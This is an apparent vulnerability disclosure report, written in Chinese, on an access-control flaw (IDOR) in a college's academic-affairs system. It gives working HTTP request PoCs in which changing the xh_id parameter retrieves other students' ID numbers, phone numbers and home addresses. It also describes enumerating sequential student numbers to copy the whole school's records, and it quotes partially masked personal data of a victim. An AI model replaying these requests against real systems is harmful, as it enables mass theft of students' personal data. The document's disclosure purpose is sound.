
# jwsys.xxx.edu.cn 存在学生信息查询接口水平越权导致全校学生身份证号等敏感个人信息泄露漏洞



## 漏洞描述

==正方教务把用户的数据交给请求参数决定，而不是交给会话决定==。学生登录后，==前端在查询自身信息时会带上 xh_id（学号）参数；服务端直接拿这个参数去查库，既没有校验 xh_id 是否等于当前会话的学号，也没有走「代查/管理查看」的授权通道。于是持有一个学生账号的人，把 xh_id 改成别人的学号，就能拿到别人的完整学籍档案。==


两个入口的表现略有差别，但根因一致：

- 学籍信息接口 `/xsxxxggl/xsxxwh_cxCkDgxsxx.html`：只要一个 xh_id 参数即可指定查询对象，xh 参数被忽略；

- 课表接口 `/kbcx/xskbcx_cxXsgrkb.html`：需要同时提交 xh 与 xh_id，服务端以请求体里的 xh 为查询主体。


学籍接口返回的字段包括：姓名、性别、民族、政治面貌、出生日期、身份证号（zjhm）、手机号（sjhm）、家庭详细住址（jtdz）、户口所在地（hkszd）、生源地（syd）、毕业中学（byzx）、考生号/报名号（ksh/bdh）、入学日期与入学总分、学籍状态、培养层次、学生类别、辅导员。除成绩与家庭成员的完整子表外，一名学生可被冒用的身份要素几乎齐全。


由于 xh_id 就是学号，而学院学号为 10 位、前缀固定、尾号连续（本账号 …1939，相邻 …1938 即另一名学生），攻击者用自己的账号登录一次，之后按学号顺序替换 xh_id 即可逐个取数，形成「学号 → 姓名 → 身份证号 → 手机号 → 家庭住址」的全校学生档案库。身份证号含出生日期与籍贯地区码，可直接用于实名认证绕过、精准诈骗与社工。






## 漏洞复现步骤


### Step 1：确认会话有效
```
POC：

GET /xtgl/index_initMenu.html HTTP/1.1  
Host: jwsys.xxxx.edu.cn  
Cookie: JSESSIONID=8779A0D2DE88FCF6C5D396DE761AC701; route=43b14a00993987acb9dcbe8197a7e1d3  
Referer: [https://jwsys.xxx.edu.cn/](https://jwsys.swcvc.edu.cn/)
```

结果：200，返回学生角色菜单页（约 69KB），会话有效。

![](Pasted%20image%2020261024225022.png)








### Step 2：用本人 xh_id 建立基本连接

先确认该接口在正常使用时的形态：xh_id 填本人学号，返回本人档案。

POC：
```
POST /xsxxxggl/xsxxwh_cxCkDgxsxx.html?gnmkdm=N100801 HTTP/1.1  
Host: jwsys.xxxx.edu.cn  
Cookie: JSESSIONID=8779A0D2DE88FCF6C5D396DE761AC701; route=43b14a00993987acb9dcbe8197a7e1d3  
X-Requested-With: XMLHttpRequest  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
Referer: https://jwsys.xxxx.edu.cn/  
  
xnm=2024&xqm=12&xh_id=242300xxxx
```

结果：200，返回本人 xxx / 242300xxxx 的学籍记录（含本人身份证号）。

![](Pasted%20image%2020261024225103.png)








### Step 3：只把 xh_id 换成他人学号，同一会话重放

其余参数、Cookie 完全不变，仅 xh_id 改为相邻同学 242300xx38。

POC：
```

POST /xsxxxggl/xsxxwh_cxCkDgxsxx.html?gnmkdm=N100801 HTTP/1.1  
Host: jwsys.xxx.edu.cn  
Cookie: JSESSIONID=8779A0D2DE88FCF6C5D396DE761AC701; route=43b14a00993987acb9dcbe8197a7e1d3  
X-Requested-With: XMLHttpRequest  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
Referer: https://jwsys.xxx.edu.cn/  
  
xnm=2024&xqm=12&xh_id=242300xx38
```

结果：200，返回他人完整学籍：xh=242300xxxx、xm=xxx、xbm=女、zjhm=5119222xx6040xxxxx、sjhm=1980827xxxx、jtdz=xx省xx市xx县仁和镇和盛街139号 —— 越权成立。

![](Pasted%20image%2020261024225218.png)







### Step 4：参数列表，确认是「请求参数决定查询对象」

四次请求固定使用本人会话，只改参数组合：

A_self_baseline        len=1426   xh=242300xx39  xm=xxx  身份证=有  
B_other_xh_only        len=1426   xh=242300xx39  xm=xxx  身份证=有  
C_other_xhid_only      len=1444   xh=242300xx38  xm=xxx 身份证=有  
D_other_both_no_from   len=1444   xh=242300xx38  xm=xxx  身份证=有

结论：只传 xh 时服务端忽略它、返回本人；只传 xh_id 就能取到他人；两者同传时仍以 xh_id 为准。说明对象级鉴权完全缺失，且攻击者只需控制一个参数。

![](Pasted%20image%2020261024225312.png)







### Step 5：同一根因的第二个入口（课表）

课表接口用 xh + xh_id 同时指定对象，同样返回他人身份与完整课表。

POC：
```

POST /kbcx/xskbcx_cxXsgrkb.html?gnmkdm=N2151 HTTP/1.1  
Host: jwsys.xxx.edu.cn  
Cookie: JSESSIONID=8779A0D2DE88FCF6C5D396DE761AC701; route=43b14a00993987acb9dcbe8197a7e1d3  
X-Requested-With: XMLHttpRequest  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
Referer: https://jwsys.xxx.edu.cn/xtgl/index_initMenu.html  
  
xnm=2024&xqm=12&xh=2423001938&xh_id=2423001938
```


![](Pasted%20image%2020261024225345.png)

结果：200，54477 字节，返回他人 31 条课表（课程、任课教师、教室、节次、教学班号）。








### Step 6：==确认泄露规模是「全校在籍」而非个例==

该接口是做「学号 → 单条学籍」的精确查询，不是一个会返回整表的列表接口。用两个请求即可定性：
```

POC：

POST /xsxxxggl/xsxxwh_cxCkDgxsxx.html?gnmkdm=N100801 HTTP/1.1  
Host: jwsys.xxx.edu.cn  
Cookie: JSESSIONID=8779A0D2DE88FCF6C5D396DE761AC701; route=43b14a00993987acb9dcbe8197a7e1d3  
X-Requested-With: XMLHttpRequest  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
  
xnm=2024&xqm=12&xh_id=2423999999      # 不存在的学号xnm=2024&xqm=12&xh_id=                 # 空值  
```


结果：不存在的学号返回 `null`（4 字节）；空值则回落为本人。也就是说——凡是教务库里存在的学号，都能被取到，且一次一条。

![](Pasted%20image%2020261024235947.png)


因此受影响记录数 = 教务库中全部有效学号对应的学生档案（并不限于在籍）。学院官网首页「基础数据」公布的口径为全日制在校生 11,682 人（高职＋中职＋留学生），第三方院校库同期口径为 11,395 人。进一步核验证实，学籍表同时保留历届毕业生档案——2019–2022 级毕业生（学籍状态「毕业／结业」）同样可读，且同样返回身份证号。按 2019–2026 级共 8 个年级块抽样外推，实际可读档案约 29,249 条（95% 置信区间 19,353 ~ 40,410）。







## 漏洞危害

- 影响规模：==**约 29,249 条学生学籍记录**==（2019–2026 级共 8 个年级块抽样外推，95% 置信区间 19,353 ~ 40,410），其中在读学生约 16,617 条、历届毕业生（2019–2022 级）约 12,631 条；每条含 20 余个敏感字段，其中身份证号、手机号、家庭住址为强标识信息；按 29,249 × 20 估算，可一次性触及的敏感数据点约 58 万个。

- 已实测读到他人身份证号 51192220060xxxxxxx、手机号 1980827xxxx、家庭详细住址「xx省xx市xx县xx镇和盛街139号」、出生日期 2006-04-03、毕业中学「xx省xx县职业中学」、考生号 2451150460xxxx、户口所在地「xx省xx市xx县」，以及姓名、性别、民族、政治面貌、学籍状态、辅导员等信息。

- 受害者全程无感知、无需任何操作：攻击者只用自己账号登录，改一个参数即可；学号连续且覆盖历届，脚本遍历即可把全校在读与历届毕业学生的身份要素成库导出。

- 身份证号同时泄露出生日期与籍贯地区码，配合手机号与家庭住址，可支撑实名认证绕过、精准电信诈骗、助学贷款/校园贷冒名、社工钓鱼等下游攻击。

- 同一根因还波及课表接口，可读取他人作息与上课地点（行踪规律），可做人物画像。



























































































